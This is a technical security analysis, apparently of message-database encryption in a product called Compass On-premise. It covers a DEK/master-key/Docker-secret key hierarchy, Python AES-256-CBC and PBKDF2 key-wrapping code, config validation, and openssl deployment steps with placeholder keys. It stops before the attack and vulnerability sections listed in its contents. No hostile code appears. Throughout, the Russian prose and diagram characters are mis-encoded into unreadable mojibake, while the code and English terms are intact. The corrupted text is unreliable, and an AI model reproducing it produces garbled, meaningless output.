# –ê–Ω–∞–ª–∏–∑ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏–π –≤ Compass On-premise

## –û–≥–ª–∞–≤–ª–µ–Ω–∏–µ

1. [–û–±–∑–æ—Ä](#–æ–±–∑–æ—Ä)
2. [–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è](#–∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞-—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è)
3. [–¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ –¥–µ—Ç–∞–ª–∏ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏](#—Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ-–¥–µ—Ç–∞–ª–∏-—Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏)
4. [–ü—Ä–æ—Ü–µ—Å—Å —Ä–∞–±–æ—Ç—ã —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è](#–ø—Ä–æ—Ü–µ—Å—Å-—Ä–∞–±–æ—Ç—ã-—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è)
5. [–ê–Ω–∞–ª–∏–∑ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏](#–∞–Ω–∞–ª–∏–∑-–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏)
6. [–°—Ü–µ–Ω–∞—Ä–∏–∏ –∞—Ç–∞–∫](#—Å—Ü–µ–Ω–∞—Ä–∏–∏-–∞—Ç–∞–∫)
7. [–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏](#–∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏–µ-—É—è–∑–≤–∏–º–æ—Å—Ç–∏)
8. [–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ —É–ª—É—á—à–µ–Ω–∏—é](#—Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏-–ø–æ-—É–ª—É—á—à–µ–Ω–∏—é)
9. [–í—ã–≤–æ–¥—ã](#–≤—ã–≤–æ–¥—ã)

---

## –û–±–∑–æ—Ä

Compass On-premise –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –º–µ—Ö–∞–Ω–∏–∑–º —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏–π –Ω–∞ —É—Ä–æ–≤–Ω–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –ø–µ—Ä–µ–¥ –∑–∞–ø–∏—Å—å—é –≤ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö. –¶–µ–ª—å - –∑–∞—â–∏—Ç–∞ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ —á–∞—Ç–æ–≤ –ø—Ä–∏ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏ –ë–î –∏–ª–∏ —Ä–µ–∑–µ—Ä–≤–Ω—ã—Ö –∫–æ–ø–∏–π.

**–ö–ª—é—á–µ–≤—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã:**
- **–ê–ª–≥–æ—Ä–∏—Ç–º:** AES-256-CBC
- **–î–µ—Ä–∏–≤–∞—Ü–∏—è –∫–ª—é—á–∞:** PBKDF2-HMAC-SHA256 (10000 –∏—Ç–µ—Ä–∞—Ü–∏–π)
- **–†–µ–∂–∏–º—ã —Ä–∞–±–æ—Ç—ã:** `none`, `read_write`, `read`
- **–°—Ç–∞—Ç—É—Å –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é:** –û—Ç–∫–ª—é—á–µ–Ω–æ (`mode: "none"`)

---

## –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è

### –î–≤—É—Ö—É—Ä–æ–≤–Ω–µ–≤–∞—è —Å–∏—Å—Ç–µ–º–∞ –∫–ª—é—á–µ–π

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  –ö–ª—é—á —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö (Data Encryption Key) ‚îÇ
‚îÇ           256 –±–∏—Ç (32 –±–∞–π—Ç–∞)                ‚îÇ
‚îÇ  ‚îú‚îÄ –°–æ–∑–¥–∞–µ—Ç—Å—è –≤ –¥–æ–≤–µ—Ä–µ–Ω–Ω–æ–º –∫–æ–Ω—Ç—É—Ä–µ          ‚îÇ
‚îÇ  ‚îú‚îÄ –ù–ï –¥–æ–ª–∂–µ–Ω —Ö—Ä–∞–Ω–∏—Ç—å—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ          ‚îÇ
‚îÇ  ‚îî‚îÄ –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏–π   ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                    ‚Üì
            (–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω —Å –ø–æ–º–æ—â—å—é)
                    ‚Üì
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ      –ú–∞—Å—Ç–µ—Ä-–∫–ª—é—á (Master Key)               ‚îÇ
‚îÇ           256 –±–∏—Ç (32 –±–∞–π—Ç–∞)                ‚îÇ
‚îÇ  ‚îú‚îÄ –°–æ–∑–¥–∞–µ—Ç—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è         ‚îÇ
‚îÇ  ‚îú‚îÄ –•—Ä–∞–Ω–∏—Ç—Å—è –≤ configs/database.yaml        ‚îÇ
‚îÇ  ‚îî‚îÄ –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏ KEK        ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                    ‚Üì
            (—Ä–∞—Å—à–∏—Ñ—Ä–æ–≤—ã–≤–∞–µ—Ç)
                    ‚Üì
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ    –ö–ª—é—á-—Å–µ–∫—Ä–µ—Ç (Key Encryption Key - KEK)   ‚îÇ
‚îÇ  ‚îú‚îÄ –•—Ä–∞–Ω–∏—Ç—Å—è –≤ Docker Secret                ‚îÇ
‚îÇ  ‚îú‚îÄ Base64(Encrypted(DEK, Master Key))      ‚îÇ
‚îÇ  ‚îî‚îÄ –ò–º—è: compass_database_encryption_secret_key ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### –ö–æ–º–ø–æ–Ω–µ–Ω—Ç—ã —Å–∏—Å—Ç–µ–º—ã

1. **–ö–ª—é—á —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö (DEK)** - —Ñ–∞–π–ª: `script/create_secret.py:160-194`
   - –®–∏—Ñ—Ä—É–µ—Ç —Ñ–∞–∫—Ç–∏—á–µ—Å–∫–∏–µ –¥–∞–Ω–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏–π
   - –î–æ–ª–∂–µ–Ω —Å–æ–∑–¥–∞–≤–∞—Ç—å—Å—è –≤–Ω–µ —Å–µ—Ä–≤–µ—Ä–∞
   - 256-–±–∏—Ç–Ω—ã–π —Å–ª—É—á–∞–π–Ω—ã–π –∫–ª—é—á

2. **–ú–∞—Å—Ç–µ—Ä-–∫–ª—é—á** - —Ñ–∞–π–ª: `yaml_template/configs/database.tpl.yaml:64-66`
   - –•—Ä–∞–Ω–∏—Ç—Å—è –≤ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ (–æ—Ç–∫—Ä—ã—Ç—ã–π —Ç–µ–∫—Å—Ç –≤ base64)
   - –ü–µ—Ä–µ–¥–∞–µ—Ç—Å—è —á–µ—Ä–µ–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è
   - –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏ KEK

3. **Docker Secret** - —Ñ–∞–π–ª: `src/monolith/compose.goyaml:3-7`
   - –ó–∞—â–∏—â–∞–µ—Ç –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π DEK –æ—Ç –æ–±—ã—á–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
   - –ú–æ–Ω—Ç–∏—Ä—É–µ—Ç—Å—è –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä: `/run/secrets/compass_database_encryption_secret_key`
   - –ò–∑–≤–ª–µ–∫–∞–µ—Ç—Å—è root-–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º

---

## –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ –¥–µ—Ç–∞–ª–∏ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏

### 1. –ê–ª–≥–æ—Ä–∏—Ç–º —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∫–ª—é—á–∞

**–§–∞–π–ª:** `script/create_secret.py:17-46`

```python
def encrypt(password: bytes, to_encrypt: bytes):
    """
    –®–∏—Ñ—Ä—É–µ—Ç –∫–ª—é—á –¥–∞–Ω–Ω—ã—Ö —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º CBC-–∞–ª–≥–æ—Ä–∏—Ç–º–∞.
    –í–µ–∫—Ç–æ—Ä —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∏ –∫–ª—é—á –ø–æ–ª—É—á–∞—é—Ç—Å—è –∏–∑ pbkdf2
    –∏—Å—Ö–æ–¥–Ω–æ–≥–æ –∫–ª—é—á–∞ (—Å–æ–≤–º–µ—Å—Ç–∏–º–æ —Å OpenSSL).
    """
    bs = AES.block_size  # 16 –±–∞–π—Ç
    salt = urandom(bs - len(b'Salted__'))  # 8 –±–∞–π—Ç —Å–ª—É—á–∞–π–Ω–æ–π —Å–æ–ª–∏

    # PBKDF2: 10000 –∏—Ç–µ—Ä–∞—Ü–∏–π, SHA-256, –≤—ã—Ö–æ–¥ 48 –±–∞–π—Ç
    pbk = pbkdf2_hmac('sha256', password, salt, 10000, 48)
    key = pbk[:32]   # –ü–µ—Ä–≤—ã–µ 32 –±–∞–π—Ç–∞ = AES-256 –∫–ª—é—á
    iv = pbk[32:48]  # –°–ª–µ–¥—É—é—â–∏–µ 16 –±–∞–π—Ç = IV

    cipher = AES.new(key, AES.MODE_CBC, iv)
    result = (b'Salted__' + salt)

    # –ß—Ç–µ–Ω–∏–µ –±–ª–æ–∫–∞–º–∏ –ø–æ 1024 * 16 –±–∞–π—Ç
    to_encrypt_bytes = BytesIO(to_encrypt)
    finished = False

    while not finished:
        chunk = to_encrypt_bytes.read(1024 * bs)

        if len(chunk) == 0 or len(chunk) % bs != 0:
            # PKCS#7 padding
            padding_length = (bs - len(chunk) % bs) or bs
            chunk += (padding_length * chr(padding_length)).encode()
            finished = True

        result += cipher.encrypt(chunk)

    return result
```

**–û—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏:**
- –°–æ–≤–º–µ—Å—Ç–∏–º–æ —Å `openssl enc -aes-256-cbc -pbkdf2`
- –ò—Å–ø–æ–ª—å–∑—É–µ—Ç PKCS#7 padding
- –§–æ—Ä–º–∞—Ç: `Salted__` + 8 –±–∞–π—Ç —Å–æ–ª–∏ + –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ

### 2. –°–æ–∑–¥–∞–Ω–∏–µ Docker Secret

**–§–∞–π–ª:** `script/create_secret.py:160-204`

```python
def init(self):
    """–°–æ–∑–¥–∞–µ—Ç —Å–µ–∫—Ä–µ—Ç –∏–∑ –¥–∞–Ω–Ω—ã—Ö"""

    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–≥–æ —Å–µ–∫—Ä–µ—Ç–∞
    self._check_existing()

    # –ü–æ–ª—É—á–µ–Ω–∏–µ –∫–ª—é—á–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö
    encryption_binary_key = self.represent_as_base64_string()

    # –ü–æ–ª—É—á–µ–Ω–∏–µ –º–∞—Å—Ç–µ—Ä-–∫–ª—é—á–∞
    master_binary_key = self.represent_as_base64_string()

    # –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ DEK –º–∞—Å—Ç–µ—Ä-–∫–ª—é—á–æ–º
    secret_key = encrypt(master_binary_key, encryption_binary_key)

    # –°–æ–∑–¥–∞–Ω–∏–µ Docker secret
    create_docker_secret(
        self.name,  # compass_database_encryption_secret_key
        base64.b64encode(secret_key)
    )

    # –í—ã–≤–æ–¥ –º–∞—Å—Ç–µ—Ä-–∫–ª—é—á–∞ –¥–ª—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
    print("–ú–∞—Å—Ç–µ—Ä –∫–ª—é—á –¥–ª—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏: %s" %
          base64.b64encode(master_binary_key).decode("utf-8"))
```

### 3. –í–∞–ª–∏–¥–∞—Ü–∏—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏

**–§–∞–π–ª:** `script/validate_db_configuration.py:333-387`

```python
class EncryptDBConf:
    """–ö–ª–∞—Å—Å-—ç–∫–∑–µ–º–ø–ª—è—Ä–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –ë–î"""

    def try_conf(self):
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –∫–æ–Ω—Ñ–∏–≥ –Ω–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å"""

        # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–µ–∂–∏–º–∞ —Ä–∞–±–æ—Ç—ã
        mode = self.cnf.get("mode", None)
        if mode is None or mode not in allowed_encrypt_mode_list:
            return False, "–£–∫–∞–∑–∞–Ω –Ω–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä ¬´mode¬ª"

        # –î–ª—è —Ä–µ–∂–∏–º–∞ none –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –ø—Ä–æ–≤–µ—Ä–æ–∫ –Ω–µ –Ω—É–∂–Ω–æ
        if mode == "none":
            return True, ""

        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –º–∞—Å—Ç–µ—Ä-–∫–ª—é—á–∞
        master_key = self.cnf.get("master_key", None)
        if master_key is None or master_key == "":
            return False, "–ú–∞—Å—Ç–µ—Ä –∫–ª—é—á –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —É–∫–∞–∑–∞–Ω"

        # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏—è Docker secret
        client = docker.from_env()
        try:
            existing = client.secrets.get(
                "compass_database_encryption_secret_key"
            )
        except docker.errors.NotFound:
            return False, "Docker-—Å–µ–∫—Ä–µ—Ç –¥–æ–ª–∂–µ–Ω —Å—É—â–µ—Å—Ç–≤–æ–≤–∞—Ç—å"

        return True, ""
```

**–†–µ–∂–∏–º—ã —Ä–∞–±–æ—Ç—ã:**
- `none` - —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –æ—Ç–∫–ª—é—á–µ–Ω–æ
- `read_write` - —á—Ç–µ–Ω–∏–µ –∏ –∑–∞–ø–∏—Å—å –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
- `read` - —á—Ç–µ–Ω–∏–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã—Ö, –∑–∞–ø–∏—Å—å –Ω–µ–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö

**–í–ê–ñ–ù–û:** –ü–æ—Å–ª–µ –≤–∫–ª—é—á–µ–Ω–∏—è `read_write` –ø–µ—Ä–µ–∫–ª—é—á–∏—Ç—å—Å—è –Ω–∞ `none` –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ (—Å—Ç—Ä–æ–∫–∞ 401)!

### 4. –ü–µ—Ä–µ–¥–∞—á–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä

**–§–∞–π–ª:** `src/domino/variable/common.goenv:138-140`

```env
# –ø–∞—Ä–∞–º–µ—Ç—Ä—ã —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –±–¥
DATABASE_ENCRYPTION_MASTER_KEY={{.database_encryption.master_key}}
DATABASE_ENCRYPTION_MODE={{.database_encryption.mode}}
```

**–§–∞–π–ª:** `src/monolith/compose.goyaml:1025-1028`

```yaml
{{- if ne .database_encryption.mode "none"}}
secrets:
  - "compass_database_encryption_secret_key"
{{- end}}
```

Docker –º–æ–Ω—Ç–∏—Ä—É–µ—Ç secret –≤: `/run/secrets/compass_database_encryption_secret_key`

---

## –ü—Ä–æ—Ü–µ—Å—Å —Ä–∞–±–æ—Ç—ã —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è

### –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è (—Ä–∞–∑–≤–µ—Ä—Ç—ã–≤–∞–Ω–∏–µ)

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ –®–∞–≥ 1: –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–ª—é—á–∞ –¥–∞–Ω–Ω—ã—Ö (–≤ –¥–æ–≤–µ—Ä–µ–Ω–Ω–æ–º –∫–æ–Ω—Ç—É—Ä–µ)       ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
$ openssl rand -out data_key.bin 32
$ cat data_key.bin | base64
# –†–µ–∑—É–ª—å—Ç–∞—Ç: aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxk

‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ –®–∞–≥ 2: –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –º–∞—Å—Ç–µ—Ä-–∫–ª—é—á–∞ (–Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ)                 ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
$ openssl rand -out master_key.bin 32
$ cat master_key.bin | base64
# –†–µ–∑—É–ª—å—Ç–∞—Ç: bWFzdGVya2V5bWFzdGVya2V5bWFzdGVya2V5bWFz

‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ –®–∞–≥ 3: –°–æ–∑–¥–∞–Ω–∏–µ Docker Secret                              ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
$ sudo python3 script/create_secret.py
> –í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø —Å–µ–∫—Ä–µ—Ç–∞: 1
> –í–≤–µ–¥–∏—Ç–µ base64 –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ –∫–ª—é—á–∞: aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxk
> –í–≤–µ–¥–∏—Ç–µ base64 –º–∞—Å—Ç–µ—Ä –∫–ª—é—á–∞: bWFzdGVya2V5bWFzdGVya2V5bWFzdGVya2V5bWFz

# –°–∫—Ä–∏–ø—Ç –≤—ã–ø–æ–ª–Ω—è–µ—Ç:
# 1. DEK_encrypted = AES-256-CBC(DEK, pbkdf2(master_key))
# 2. docker secret create compass_database_encryption_secret_key \
#    <(echo $DEK_encrypted | base64)

‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ –®–∞–≥ 4: –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏                              ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
$ nano configs/database.yaml

database_encryption:
  mode: "read_write"
  master_key: "bWFzdGVya2V5bWFzdGVya2V5bWFzdGVya2V5bWFz"

